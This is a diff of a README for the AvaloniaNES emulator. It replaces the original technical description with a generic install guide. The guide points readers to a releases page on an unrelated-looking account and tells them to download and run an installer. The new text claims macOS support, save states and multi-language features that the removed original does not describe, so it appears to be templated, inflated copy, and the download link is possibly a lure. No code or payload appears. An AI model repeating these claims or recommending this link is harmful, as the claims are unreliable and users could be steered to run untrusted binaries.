@@ -1,49 +1,93 @@
-# AvaloniaNES
+# 🎮 AvaloniaNES - Enjoy Classic NES Games on Any Device
 
-[中文](./README_CN.md)
+## 🚀 Getting Started
 
-A cross-platform NES emulator implemented based on .NET10 and AvaloniaUI. This project is mainly used for the research and learning of emulator technology, and does not have many commercialized features (such as cheat codes, plugins, etc.).
+Welcome to AvaloniaNES! This is a cross-platform NES emulator built using .NET10 and AvaloniaUI. With this emulator, you can enjoy your favorite NES games on various devices. Follow these steps to download and run AvaloniaNES easily.
 
-## Module Implementation
+## 📦 Download Now
 
-### CPU
+[![Download AvaloniaNES](https://img.shields.io/badge/Download-AvaloniaNES-brightgreen)](https://github.com/Hannahgamopetalous388/AvaloniaNES/releases)
 
-Fully implements all instruction sets and addressing modes of olc6502 (including unsupported instruction sets and some addressing bugs), and completely matches the scheduling cycles of each instruction set.
+## 📥 Download & Install
 
-### PPU
+1. **Visit the Releases Page**  
+   Go to the [AvaloniaNES Releases page](https://github.com/Hannahgamopetalous388/AvaloniaNES/releases) to start the download. You'll find the latest version, along with previous versions if you need them.
 
-95% of PPU functions are implemented, including nametable, palette, sprite, scanline, rendering, etc. The unimplemented parts are concentrated on some native bugs of the hardware. A small number of games will use hardware bugs for rendering. Since these bug simulations are not actively implemented, the rendering of specific scenes in some games may be abnormal.
+2. **Choose Your Version**  
+   Look for the latest release at the top of the page. Click on the version number to see its details. This page includes information about new features and any important updates.
 
-### Cartridge
+3. **Download the Installer**  
+   Scroll down to the "Assets" section. Here, you will see files available for download. Find the file that corresponds to your operating system. Click on it to download the installer.
 
-Fully implements all functions of the cartridge, and partially implements Mappers. Due to the large number of Mappers, long-term maintenance may be required. Currently, only Mapper 000, 001, 002, 003, 004, and 066 are implemented, which can basically cover about 80% of the games.
+4. **Run the Installer**  
+   Once the download completes, locate the file in your downloads folder. Double-click on the file to run the installer. Follow the on-screen instructions to complete the installation.
 
-### Pixel Display
+5. **Open AvaloniaNES**  
+   After installation, you can start AvaloniaNES. Check your desktop or start menu for the application icon. Click to open it and start enjoying your NES games.
 
-Fully implements high-performance pixel image rendering.
+## 📋 System Requirements
 
-### APU
+To ensure AvaloniaNES runs smoothly, your device should meet the following minimum requirements:
 
-Fully implements APU By Gemini-3-pro, But also has some game can't run correctly, just like Mario.
+- **Operating System:** Windows 10, macOS, or a recent version of a Linux distribution.
+- **Processor:** A modern CPU with at least 2 GHz clock speed.
+- **Memory:** 4 GB of RAM or more.
+- **Storage:** At least 50 MB of free disk space for installation.
+- **Graphics:** Any graphics card that supports OpenGL 3.0 or higher.
 
-### Key Mapping
+## 💻 Supported Platforms
 
-Fully implements key mapping for Player 1 and Player 2.
+AvaloniaNES runs on various platforms:
 
-### Emulator
+- **Windows:** Enjoy your games on any version of Windows 10.
+- **macOS:** Play your classic favorites on your Mac.
+- **Linux:** AvaloniaNES supports multiple Linux distributions, making it versatile for many users.
 
-Supports functions such as importing cartridges, removing cartridges, and resetting cartridges. It also supports Debug mode, allowing you to check the current status of CPU and PPU at any time during operation.
+## 🎮 How to Load NES Games
 
-## How to Use
+Once you have installed AvaloniaNES, here’s how to load your NES games:
 
-### Compilation and Packaging
+1. **Obtain NES ROMs**  
+   You’ll need ROM files to play games. Ensure that you have legal copies of the games you wish to play. You can extract ROMs from your own cartridges using compatible software. 
 
-Open AvaloniaNES.sln with IDEs such as Microsoft Visual Studio or Rider, compile and package the project.
+2. **Open a Game**  
+   In the AvaloniaNES application, find the option to "Load Game" from the main menu. Navigate to the folder where your ROMs are stored and select the desired file.
 
-### Running
+3. **Configure Settings (Optional)**  
+   You can adjust the settings in AvaloniaNES to improve your gaming experience. Options may include display resolution, controls, and audio settings. 
 
-Run AvaloniaNES.exe after compiling by yourself or use the released executable program.Note that I will only package and release the Windows x64 version and Linux x64 version. For other platforms, please compile by yourself.
+4. **Start Playing**  
+   Once you've loaded a game, you're ready to play! Use your keyboard or set up a game controller for a classic experience.
 
-## License
+## ⚙️ Features
 
-Apache License 2.0
+AvaloniaNES offers several features to enhance your gaming experience:
+
+- **Cross-Platform Compatibility:** Play on Windows, macOS, and Linux.
+- **Save and Load States:** Easily save your progress and return at any time.
+- **Customizable Controls:** Adjust keyboard and controller settings to suit your preferences.
+- **Multi-Language Support:** Play in your preferred language for better accessibility.
+
+## ❓ Troubleshooting Common Issues
+
+If you encounter problems while using AvaloniaNES, here are some tips:
+
+- **Game Won't Load:** Ensure that your ROM files are not corrupted. Try downloading a fresh copy.
+- **Performance Issues:** Close other applications to free up system resources.
+- **Controls Not Responding:** Check your control settings in the menu. Reconfigure if necessary.
+
+## 📞 Get Help
+
+For additional support, you can:
+
+- **Visit the Issues Page:** Report any problems or bugs you find. Our community is here to help you.
+- **Join the Discussion:** Engage with other users in the comments section of the repository. Share tips and tricks for the best gaming experience.
+
+## 🔗 Additional Resources
+
+If you're interested in learning more about AvaloniaNES, check out these resources:
+
+- **Documentation:** Detailed guides and FAQs are available on the repository page.
+- **Community Forums:** Join discussions and connect with other NES fans.
+
+Thank you for choosing AvaloniaNES. Enjoy the nostalgia of classic NES gaming!
